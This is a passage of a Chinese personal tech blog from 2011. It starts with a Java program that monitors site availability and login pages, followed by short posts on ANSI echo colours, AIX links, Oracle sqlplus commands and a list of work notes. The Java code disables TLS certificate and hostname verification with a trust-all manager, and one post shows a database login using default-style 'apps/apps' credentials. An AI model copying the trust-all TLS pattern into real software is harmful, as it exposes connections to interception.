class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.security.cert.CertificateException;</span><br><span class="line">import java.security.cert.X509Certificate;</span><br><span class="line">import java.text.SimpleDateFormat;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.ResourceBundle;</span><br><span class="line">import java.util.concurrent.Executors;</span><br><span class="line">import java.util.concurrent.ScheduledExecutorService;</span><br><span class="line">import java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line">import javax.net.ssl.SSLContext;</span><br><span class="line">import javax.net.ssl.TrustManager;</span><br><span class="line">import javax.net.ssl.X509TrustManager;</span><br><span class="line"></span><br><span class="line">import javazoom.jl.player.Player;</span><br><span class="line"></span><br><span class="line">import org.apache.http.HttpHost;</span><br><span class="line">import org.apache.http.HttpResponse;</span><br><span class="line">import org.apache.http.client.ClientProtocolException;</span><br><span class="line">import org.apache.http.client.HttpClient;</span><br><span class="line">import org.apache.http.client.methods.HttpGet;</span><br><span class="line">import org.apache.http.client.methods.HttpPost;</span><br><span class="line">import org.apache.http.conn.ClientConnectionManager;</span><br><span class="line">import org.apache.http.conn.params.ConnRoutePNames;</span><br><span class="line">import org.apache.http.conn.scheme.Scheme;</span><br><span class="line">import org.apache.http.conn.scheme.SchemeRegistry;</span><br><span class="line">import org.apache.http.conn.ssl.SSLSocketFactory;</span><br><span class="line">import org.apache.http.impl.client.DefaultHttpClient;</span><br><span class="line">import org.apache.http.params.CoreConnectionPNames;</span><br><span class="line">import org.apache.http.util.EntityUtils;</span><br><span class="line"></span><br><span class="line">public class Monitor &#123;</span><br><span class="line"></span><br><span class="line">  private static ResourceBundle p = ResourceBundle.getBundle(&quot;Config&quot;);</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    int interval = Integer.valueOf(p.getString(&quot;interval&quot;));</span><br><span class="line">    String do_url = p.getString(&quot;do_url&quot;);</span><br><span class="line">    String pharmweb_url = p.getString(&quot;pharmweb_url&quot;);</span><br><span class="line">    String do_login_url = p.getString(&quot;do_login_url&quot;);</span><br><span class="line">    String pharmweb_login_url = p.getString(&quot;pharmweb_login_url&quot;);</span><br><span class="line">    int timeout = Integer.valueOf(p.getString(&quot;timeout&quot;));</span><br><span class="line"></span><br><span class="line">    String proxyAddress = p.getString(&quot;proxy&quot;);</span><br><span class="line">    int port = Integer.valueOf(p.getString(&quot;port&quot;));</span><br><span class="line"></span><br><span class="line">    String musicPath = p.getString(&quot;music_path&quot;);</span><br><span class="line"></span><br><span class="line">    int sendmailCount = Integer.valueOf(p</span><br><span class="line">        .getString(&quot;sendmail_interrupt_count&quot;));</span><br><span class="line">    int existCount = Integer.valueOf(p.getString(&quot;exit_interrupt_count&quot;));</span><br><span class="line"></span><br><span class="line">    ScheduledExecutorService service = Executors</span><br><span class="line">        .newSingleThreadScheduledExecutor();</span><br><span class="line">    Task task = new Task(do_url, do_login_url, pharmweb_url,</span><br><span class="line">        pharmweb_login_url, timeout, proxyAddress, port, musicPath,</span><br><span class="line">        sendmailCount, existCount);</span><br><span class="line">    service.scheduleWithFixedDelay(task, 0, interval, TimeUnit.SECONDS);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Task implements Runnable &#123;</span><br><span class="line">  private static final SimpleDateFormat sf = new SimpleDateFormat(</span><br><span class="line">      &quot;dd/MM/yyyy HH:mm:ss&quot;);</span><br><span class="line"></span><br><span class="line">  private String do_url ;</span><br><span class="line">  private String pharmweb_url ;</span><br><span class="line">  private String do_login_url ;</span><br><span class="line">  private String pharmweb_login_url ;</span><br><span class="line">  private int timeout = 30;</span><br><span class="line">  private String proxyAddress = &quot;proxy1.scig.gov.hk&quot;;</span><br><span class="line">  private int port = 8080;</span><br><span class="line">  private String music;</span><br><span class="line">  private int sendmailCount;</span><br><span class="line">  private int existCount;</span><br><span class="line"></span><br><span class="line">  private static HashMap&lt;String, Integer&gt; interruptCounter = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">  private static int totalErrorConnection = 0;</span><br><span class="line"></span><br><span class="line">  public Task(String do_url, String do_login_url, String pharmweb_url,</span><br><span class="line">      String pharmweb_login_url, int timeout, String proxyAddress,</span><br><span class="line">      int port, String music, int sendmailCount, int existCount) &#123;</span><br><span class="line">    this.do_url = do_url;</span><br><span class="line">    this.do_login_url = do_login_url;</span><br><span class="line">    this.pharmweb_url = pharmweb_url;</span><br><span class="line">    this.pharmweb_login_url = pharmweb_login_url;</span><br><span class="line">    this.timeout = timeout;</span><br><span class="line">    this.proxyAddress = proxyAddress;</span><br><span class="line">    this.port = port;</span><br><span class="line">    this.music = music;</span><br><span class="line">    this.sendmailCount = sendmailCount;</span><br><span class="line">    this.existCount = existCount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public void run() &#123;</span><br><span class="line">    System.out.printf(&quot;=============== %s =====================\n&quot;, sf</span><br><span class="line">        .format(new Date()));</span><br><span class="line"></span><br><span class="line">    boolean useProxy = false;</span><br><span class="line">    if (!&quot;&quot;.equals(this.proxyAddress)) &#123;</span><br><span class="line">      useProxy = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    System.out.printf(&quot;connect: %s\n&quot;, do_url);</span><br><span class="line">    if (connectionChecking(do_url, useProxy)) &#123;</span><br><span class="line">      System.out.printf(&quot;connect: %s\n&quot;, do_login_url);</span><br><span class="line">      checkDoLogin(do_login_url, useProxy);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    System.out.printf(&quot;connect: %s\n&quot;, pharmweb_url);</span><br><span class="line">    if (connectionChecking(pharmweb_url, false)) &#123;</span><br><span class="line">      System.out.printf(&quot;connect: %s\n&quot;, pharmweb_login_url);</span><br><span class="line">      checkPharmwebLogin(pharmweb_login_url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (totalErrorConnection &gt; 0) &#123;</span><br><span class="line">      System.out.printf(&quot;total error connection: [%s]\n&quot;,</span><br><span class="line">          totalErrorConnection);</span><br><span class="line">      if (totalErrorConnection &gt; this.existCount) &#123;</span><br><span class="line">        System.exit(0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;\n&quot;);</span><br><span class="line">    notifyUser();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void notifyUser() &#123;</span><br><span class="line">    for (String url : interruptCounter.keySet()) &#123;</span><br><span class="line">      int connectErrors = interruptCounter.get(url);</span><br><span class="line"></span><br><span class="line">      if (connectErrors &gt; this.sendmailCount) &#123;</span><br><span class="line">        System.out.println(&quot;send mail to notify users. error url: &quot;</span><br><span class="line">            + url);</span><br><span class="line">        interruptCounter.put(url, 0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private boolean connectionChecking(String url, boolean useProxy) &#123;</span><br><span class="line">    DefaultHttpClient client = new DefaultHttpClient();</span><br><span class="line">    if (useProxy) &#123;</span><br><span class="line">      HttpHost proxy = new HttpHost(proxyAddress, port);</span><br><span class="line">      client.getParams().setParameter(ConnRoutePNames.DEFAULT_PROXY,</span><br><span class="line">          proxy);</span><br><span class="line">    &#125;</span><br><span class="line">    client.getParams().setParameter(</span><br><span class="line">        CoreConnectionPNames.CONNECTION_TIMEOUT, timeout);</span><br><span class="line"></span><br><span class="line">    HttpGet httpget = new HttpGet(url);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      HttpResponse response = client.execute(httpget);</span><br><span class="line">      System.out.println(response.getStatusLine());</span><br><span class="line">      return true;</span><br><span class="line">    &#125; catch (ClientProtocolException e) &#123;</span><br><span class="line">      processException(url, e);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">      processException(url, e);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">      postProcess(client, url);</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void checkPharmwebLogin(String url) &#123;</span><br><span class="line">    final DefaultHttpClient client = new DefaultHttpClient();</span><br><span class="line">    client.getParams().setParameter(</span><br><span class="line">        CoreConnectionPNames.CONNECTION_TIMEOUT, timeout);</span><br><span class="line"></span><br><span class="line">    HttpPost httpget = new HttpPost(url);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      HttpResponse response = client.execute(httpget);</span><br><span class="line">      System.out.println(response.getStatusLine());</span><br><span class="line">    &#125; catch (ClientProtocolException e) &#123;</span><br><span class="line">      processException(url, e);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">      processException(url, e);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">      postProcess(client, url);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void checkDoLogin(String url, boolean useProxy) &#123;</span><br><span class="line">    HttpClient client = WebClientDevWrapper</span><br><span class="line">        .wrapClient(new DefaultHttpClient());</span><br><span class="line">    HttpPost httpget = new HttpPost(url);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">      if (useProxy) &#123;</span><br><span class="line">        HttpHost proxy = new HttpHost(proxyAddress, port);</span><br><span class="line">        client.getParams().setParameter(ConnRoutePNames.DEFAULT_PROXY,</span><br><span class="line">            proxy);</span><br><span class="line">      &#125;</span><br><span class="line">      client.getParams().setParameter(</span><br><span class="line">          CoreConnectionPNames.CONNECTION_TIMEOUT, timeout);</span><br><span class="line">      HttpResponse response = client.execute(httpget);</span><br><span class="line">      System.out.println(response.getStatusLine());</span><br><span class="line"></span><br><span class="line">      EntityUtils.consume(response.getEntity());</span><br><span class="line">    &#125; catch (ClientProtocolException e) &#123;</span><br><span class="line">      processException(url, e);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">      processException(url, e);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">      postProcess(client, url);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void processException(String url, Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    System.out.printf(&quot;connect error:[%s]\n &quot;, url);</span><br><span class="line">    try &#123;</span><br><span class="line">      InputStream in = new FileInputStream(music);</span><br><span class="line">      Player player = new Player(in);</span><br><span class="line">      player.play();</span><br><span class="line">    &#125; catch (Exception e1) &#123;</span><br><span class="line">      e1.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int num = 1;</span><br><span class="line">    if (interruptCounter.containsKey(url)) &#123;</span><br><span class="line">      num = interruptCounter.get(url);</span><br><span class="line">      num++;</span><br><span class="line">      interruptCounter.put(url, num);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      interruptCounter.put(url, num);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.printf(&quot;url [%s] interrupt:[%d] \n&quot;, url, num);</span><br><span class="line">    totalErrorConnection++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void postProcess(HttpClient client, String url) &#123;</span><br><span class="line">    client.getConnectionManager().shutdown();</span><br><span class="line">    /*</span><br><span class="line">     * if (interruptCounter.containsKey(url)) &#123; interruptCounter.put(url,</span><br><span class="line">     * 0); &#125;</span><br><span class="line">     */</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class WebClientWrapper &#123;</span><br><span class="line">  public static HttpClient wrapClient(HttpClient base) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      SSLContext ctx = SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line">      X509TrustManager tm = new X509TrustManager() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void checkClientTrusted(X509Certificate[] arg0,</span><br><span class="line">            String arg1) throws CertificateException &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void checkServerTrusted(X509Certificate[] arg0,</span><br><span class="line">            String arg1) throws CertificateException &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">          return null;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      ctx.init(null, new TrustManager[] &#123; tm &#125;, null);</span><br><span class="line">      SSLSocketFactory ssf = new SSLSocketFactory(ctx,</span><br><span class="line">          SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);</span><br><span class="line">      ClientConnectionManager ccm = base.getConnectionManager();</span><br><span class="line">      SchemeRegistry sr = ccm.getSchemeRegistry();</span><br><span class="line">      sr.register(new Scheme(&quot;https&quot;, 443, ssf));</span><br><span class="line">      return new DefaultHttpClient(ccm, base.getParams());</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      return null;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：<br>  <a target="_blank" rel="noopener" href="http://javaskeleton.blogspot.com/2010/07/avoiding-peer-not-authenticated-with.html">http://javaskeleton.blogspot.com/2010/07/avoiding-peer-not-authenticated-with.html</a><br>  <a target="_blank" rel="noopener" href="http://javasight.net/2011/06/avoid-javax-net-ssl-sslpeerunverifiedexception/">http://javasight.net/2011/06/avoid-javax-net-ssl-sslpeerunverifiedexception/</a> </p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-apache中文翻译" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-12-13T09:34:56.000Z"><a href="/2011/12/13/apache%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/">2011-12-13</a></time>
      
      
  
    <h1 class="title"><a href="/2011/12/13/apache%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/">apache中文翻译</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://lamp.linux.gov.cn/jinbuguo_florilegium.html">http://lamp.linux.gov.cn/jinbuguo_florilegium.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-linux-echo颜色控制" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-12-12T05:43:11.000Z"><a href="/2011/12/12/linux-echo%E9%A2%9C%E8%89%B2%E6%8E%A7%E5%88%B6/">2011-12-12</a></time>
      
      
  
    <h1 class="title"><a href="/2011/12/12/linux-echo%E9%A2%9C%E8%89%B2%E6%8E%A7%E5%88%B6/">linux echo颜色控制</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="echo要变换颜色的时候，要使用参数-e"><a href="#echo要变换颜色的时候，要使用参数-e" class="headerlink" title="echo要变换颜色的时候，要使用参数-e"></a>echo要变换颜色的时候，要使用参数-e</h2><p>格式: echo -e “\033[字背景颜色;字体颜色m字符串\033[0m” </p>
<p>例如:<br>echo -e “\033[41;36m something here \033[0m” </p>
<p>其中41的位置代表底色, 36的位置是代表字的颜色 </p>
<p>那些ascii code 是对颜色调用的始末. </p>
<p>\033[ ; m …… \033[0m </p>
<h2 id="让字体变为红色并且不停的闪烁"><a href="#让字体变为红色并且不停的闪烁" class="headerlink" title="让字体变为红色并且不停的闪烁"></a>让字体变为红色并且不停的闪烁</h2><p>#echo -e “\033[31m \33[05m 请确认是否要停止当前的squid进程,输入 [Y&#x2F;N] \033[0m” </p>
<p>或者 </p>
<p>#echo -e “\033[31m \033[05m 请确认是否要停止当前的squid进程,输入 [Y&#x2F;N] \033[0m” </p>
<h2 id="字背景颜色范围-40—-49"><a href="#字背景颜色范围-40—-49" class="headerlink" title="字背景颜色范围:40—-49"></a>字背景颜色范围:40—-49</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">40:黑 </span><br><span class="line"></span><br><span class="line">41:深红 </span><br><span class="line"></span><br><span class="line">42:绿 </span><br><span class="line"></span><br><span class="line">43:黄色 </span><br><span class="line"></span><br><span class="line">44:蓝色 </span><br><span class="line"></span><br><span class="line">45:紫色 </span><br><span class="line"></span><br><span class="line">46:深绿 </span><br><span class="line"></span><br><span class="line">47:白色 </span><br></pre></td></tr></table></figure>

<h2 id="字颜色-30———–39"><a href="#字颜色-30———–39" class="headerlink" title="字颜色:30———–39"></a>字颜色:30———–39</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">30:黑 </span><br><span class="line"></span><br><span class="line">31:红 </span><br><span class="line"></span><br><span class="line">32:绿 </span><br><span class="line"></span><br><span class="line">33:黄 </span><br><span class="line"></span><br><span class="line">34:蓝色 </span><br><span class="line"></span><br><span class="line">35:紫色 </span><br><span class="line"></span><br><span class="line">36:深绿 </span><br><span class="line"></span><br><span class="line">37:白色 </span><br></pre></td></tr></table></figure>

<h2 id="ANSI控制码的说明"><a href="#ANSI控制码的说明" class="headerlink" title="ANSI控制码的说明"></a>ANSI控制码的说明</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">\33[0m 关闭所有属性 </span><br><span class="line"></span><br><span class="line">\33[1m 设置高亮度 </span><br><span class="line"></span><br><span class="line">\33[4m 下划线 </span><br><span class="line"></span><br><span class="line">\33[5m 闪烁 </span><br><span class="line"></span><br><span class="line">\33[7m 反显 </span><br><span class="line"></span><br><span class="line">\33[8m 消隐 </span><br><span class="line"></span><br><span class="line">\33[30m -- \33[37m 设置前景色 </span><br><span class="line"></span><br><span class="line">\33[40m -- \33[47m 设置背景色 </span><br><span class="line"></span><br><span class="line">\33[nA 光标上移n行 </span><br><span class="line"></span><br><span class="line">\33[nB 光标下移n行 </span><br><span class="line"></span><br><span class="line">\33[nC 光标右移n行 </span><br><span class="line"></span><br><span class="line">\33[nD 光标左移n行 </span><br><span class="line"></span><br><span class="line">\33[y;xH设置光标位置 </span><br><span class="line"></span><br><span class="line">\33[2J 清屏 </span><br><span class="line"></span><br><span class="line">\33[K 清除从光标到行尾的内容 </span><br><span class="line"></span><br><span class="line">\33[s 保存光标位置 </span><br><span class="line"></span><br><span class="line">\33[u 恢复光标位置 </span><br><span class="line"></span><br><span class="line">\33[?25l 隐藏光标 </span><br><span class="line"></span><br><span class="line">\33[?25h 显示光标 </span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-aix-url" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-12-09T08:24:02.000Z"><a href="/2011/12/09/aix-url/">2011-12-09</a></time>
      
      
  
    <h1 class="title"><a href="/2011/12/09/aix-url/">aix url</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/cn/aix/library/1111_liuge_getstartaix/?cmp=dwskl&amp;cpb=dw&amp;ct=dwcon&amp;cr=cn_CSDN&amp;ccy=cn">http://www.ibm.com/developerworks/cn/aix/library/1111_liuge_getstartaix/?cmp=dwskl&amp;cpb=dw&amp;ct=dwcon&amp;cr=cn_CSDN&amp;ccy=cn</a><br><a target="_blank" rel="noopener" href="http://darkmasky.iteye.com/blog/224936">http://darkmasky.iteye.com/blog/224936</a><br><a target="_blank" rel="noopener" href="http://space.itpub.net/9390331/viewspace-688116">http://space.itpub.net/9390331/viewspace-688116</a><br><a target="_blank" rel="noopener" href="http://www.softpanorama.org/Commercial_unixes/AIX/aix_networking.shtml">http://www.softpanorama.org/Commercial_unixes/AIX/aix_networking.shtml</a><br><a target="_blank" rel="noopener" href="http://study.chyangwa.com/IT/AIX/aixcmds1/mastertoc.htm">http://study.chyangwa.com/IT/AIX/aixcmds1/mastertoc.htm</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-sqlplus-connect-oracle" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-12-02T07:48:04.000Z"><a href="/2011/12/02/sqlplus-connect-oracle/">2011-12-02</a></time>
      
      
  
    <h1 class="title"><a href="/2011/12/02/sqlplus-connect-oracle/">sqlplus connect oracle</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="find-status-and-sid"><a href="#find-status-and-sid" class="headerlink" title="find status and sid:"></a>find status and sid:</h1><p><code>lsnrctl status</code><br><code>lsnrctl service</code></p>
<h1 id="connect-db"><a href="#connect-db" class="headerlink" title="connect db"></a>connect db</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlplus apps/apps@&quot;(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=192.168.100.5)(PORT=1521))(CONNECT_DATA=(SID=OAPROD)))&quot;</span><br></pre></td></tr></table></figure>

<h1 id="运行本地命令"><a href="#运行本地命令" class="headerlink" title="运行本地命令"></a>运行本地命令</h1><p><code>SQL&gt; host dir</code></p>
<h1 id="export-prd"><a href="#export-prd" class="headerlink" title="export prd"></a>export prd</h1><p><code>exp user/password tables=task, payment file=payment_task.dmp INDEXES=N CONSTRAINTS=N GRANTS=N ROWS=Y</code></p>
<h1 id="bakcup-uat"><a href="#bakcup-uat" class="headerlink" title="bakcup uat"></a>bakcup uat</h1><p><code>exp user/password tables=lic_app, company_cop , company , task, payment  file=cop.dmp INDEXES=N CONSTRAINTS=N GRANTS=N ROWS=Y</code></p>
<h1 id="import-uat"><a href="#import-uat" class="headerlink" title="import uat"></a>import uat</h1><pre><code>imp user/password tables=case_legal_advice file=case_legal_advice.dmp IGNORE=Y
`imp user/ password full=y file=payment_task.dmp IGNORE=Y
``

# background job
`nohup java MyProg &gt; /dev/null 2&gt;&amp;1 &amp;`
</code></pre>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-linux下启动oracle" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-11-29T09:21:49.000Z"><a href="/2011/11/29/linux%E4%B8%8B%E5%90%AF%E5%8A%A8oracle/">2011-11-29</a></time>
      
      
  
    <h1 class="title"><a href="/2011/11/29/linux%E4%B8%8B%E5%90%AF%E5%8A%A8oracle/">linux下启动oracle</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_56d8ea900100noxa.html">http://blog.sina.com.cn/s/blog_56d8ea900100noxa.html</a><br><a target="_blank" rel="noopener" href="http://apps.hi.baidu.com/share/detail/47434067">http://apps.hi.baidu.com/share/detail/47434067</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-最近工作" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2011-11-21T02:07:43.000Z"><a href="/2011/11/21/%E6%9C%80%E8%BF%91%E5%B7%A5%E4%BD%9C/">2011-11-21</a></time>
      
      
  
    <h1 class="title"><a href="/2011/11/21/%E6%9C%80%E8%BF%91%E5%B7%A5%E4%BD%9C/">最近工作</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ol>
<li><p>urlRewriteFilter</p>
</li>
<li><p>Apache(Web) + WAS(App) + Oracle(DB) 研究cluster</p>
</li>
<li><p>IPG-client 支付网关</p>
</li>
<li><p>用spool处理Change Request</p>
</li>
<li><p>oracle的daily backup 例如：磁带备份(dds, lto), AIX的mksysbackup，需要知道一些AIX的命令</p>
</li>
<li><p>研究oracle statspack</p>
</li>
<li><p>hypericHQ    <a target="_blank" rel="noopener" href="http://www.springsource.com/downloads/hyperic-open-source-downloads?sid=1417137">http://www.springsource.com/downloads/hyperic-open-source-downloads?sid=1417137</a></p>
</li>
<li><p>F5 load balancing</p>
</li>
<li><p>oracle了解alert log<br>  9.1. 从Alert_Log看Oracle数据库启动三阶段: <a target="_blank" rel="noopener" href="http://space.itpub.net/17203031/viewspace-691806">http://space.itpub.net/17203031/viewspace-691806</a><br>  9.2. 8个DBA最常用的监控Oracle数据库的常用shell脚本: <a target="_blank" rel="noopener" href="http://blog.csdn.net/tianlesoftware/article/details/4792798">http://blog.csdn.net/tianlesoftware/article/details/4792798</a></p>
</li>
<li><p>磁带机工作：</p>
</li>
</ol>
<p> <a target="_blank" rel="noopener" href="http://bbs.51cto.com/archiver/tid-829311.html">http://bbs.51cto.com/archiver/tid-829311.html</a></p>
<p>  10.1 操作磁带机命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mt</span><br><span class="line">tctl</span><br><span class="line">tapeutil</span><br><span class="line">rmt</span><br><span class="line">tcopy</span><br><span class="line">pax</span><br><span class="line">tar</span><br><span class="line">lsdev -Cc tape</span><br><span class="line">tapeutil -f /dev/smc0 invent|more</span><br><span class="line">lscfg -vps -l rmt0(ent0)</span><br><span class="line">lsattr -El rmt0</span><br></pre></td></tr></table></figure>

<p> 操作network的命令</p>
